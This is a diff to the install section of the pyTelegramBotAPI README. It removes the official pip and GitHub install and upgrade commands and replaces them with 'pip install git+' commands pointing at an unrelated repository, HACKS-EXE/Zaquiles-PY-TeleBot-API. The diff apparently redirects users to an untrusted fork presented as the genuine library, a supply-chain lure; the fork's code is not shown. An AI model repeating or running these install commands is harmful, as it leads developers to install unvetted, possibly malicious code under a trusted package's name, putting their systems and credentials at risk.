@@ -75,28 +75,17 @@
 This API is tested with Python 3.8-3.11 and Pypy 3.
 There are two ways to install the library:
 
-* Installation using pip (a Python package manager):
-
-```
-$ pip install pyTelegramBotAPI
-```
 * Installation from source (requires git):
 
 ```
-$ git clone https://github.com/eternnoir/pyTelegramBotAPI.git
-$ cd pyTelegramBotAPI
-$ python setup.py install
-```
-or:
-```
-$ pip install git+https://github.com/eternnoir/pyTelegramBotAPI.git
+$ pip install git+https://github.com/HACKS-EXE/Zaquiles-PY-TeleBot-API.git
 ```
 
 It is generally recommended to use the first option.
 
 *While the API is production-ready, it is still under development and it has regular updates, do not forget to update it regularly by calling*
 ```
-pip install pytelegrambotapi --upgrade
+pip install --upgrade git+https://github.com/HACKS-EXE/Zaquiles-PY-TeleBot-API.git
 ```
 
 ## Writing your first bot
